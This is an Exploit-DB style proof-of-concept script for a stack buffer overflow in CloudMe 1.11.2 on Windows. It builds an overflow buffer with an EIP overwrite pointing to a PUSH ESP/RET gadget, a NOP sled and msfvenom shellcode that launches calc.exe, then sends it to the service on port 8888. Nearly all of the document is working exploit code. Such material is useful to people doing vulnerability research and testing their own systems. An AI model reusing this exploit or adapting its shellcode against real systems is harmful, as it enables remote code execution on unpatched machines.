# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xb8\xf3\xae\x0b\x99\xda\xc9\xd9\x74\x24\xf4\x5a"
payload += b"\x31\xc9\xb1\x3e\x31\x42\x15\x03\x42\x15\x83\xc2"
payload += b"\x04\xe2\x06\x52\xe3\x1b\xe8\xab\xf4\x7b\x61\x4e"
payload += b"\xc5\xbb\x15\x1a\x76\x0c\x5e\x4e\x7b\xe7\x32\x7b"
payload += b"\x08\x85\x9a\x8c\xb9\x20\xfc\xa3\x3a\x18\x3c\xa5"
payload += b"\xb8\x63\x10\x05\x80\xab\x65\x44\xc5\xd6\x87\x14"
payload += b"\x9e\x9d\x35\x89\xab\xe8\x85\x22\xe7\xfd\x8d\xd7"
payload += b"\xb0\xfc\xbc\x49\xca\xa6\x1e\x6b\x1f\xd3\x17\x73"
payload += b"\x7c\xde\xee\x08\xb6\x94\xf1\xd8\x86\x55\x5d\x25"
payload += b"\x27\xa4\x9c\x61\x80\x57\xeb\x9b\xf2\xea\xeb\x5f"
payload += b"\x88\x30\x7e\x44\x2a\xb2\xd8\xa0\xca\x17\xbe\x23"
payload += b"\xc0\xdc\xb5\x6c\xc5\xe3\x1a\x07\xf1\x68\x9d\xc8"
payload += b"\x73\x2a\xb9\xcc\xd8\xe8\xa0\x55\x85\x5f\xdd\x86"
payload += b"\x66\x3f\x7b\xcc\x8b\x54\xf6\x8f\xc1\xab\x85\xb5"
payload += b"\xa4\xac\x95\xb5\x98\xc4\xa4\x3e\x77\x92\x39\x95"
payload += b"\x33\x6c\x70\xb4\x12\xe5\xdc\x2c\x27\x68\xdf\x9a"
payload += b"\x64\x95\x63\x2f\x15\x62\x7b\x5a\x10\x2e\x3c\xb6"
payload += b"\x68\x3f\xa8\xb8\xdf\x40\xf9\xda\xe5\xe2\x79\x7c"
payload += b"\x77\x6b\x09\x22\xef\xff\x8d\xb5\x8c\x8c\x11\x2d"
payload += b"\x2a\x1e\xf5\xc4\xbc\x8c\x6a\x46\x59\x11\x1a\xeb"
payload += b"\xc4\x87\x87\x93\x63\xf8\x6a\x01\x4c\x9b\x19\xad"
payload += b"\xa2\x3e\x99\x48\x9b\xf1\x69\xbd\xea\xc1\xa7\xf0"
payload += b"\x39\x0c\x85\xc4\x61\x61\xda\x1b\x55\x81"
overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	
buf = padding1 + EIP + NOPS + payload + overrun 
try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
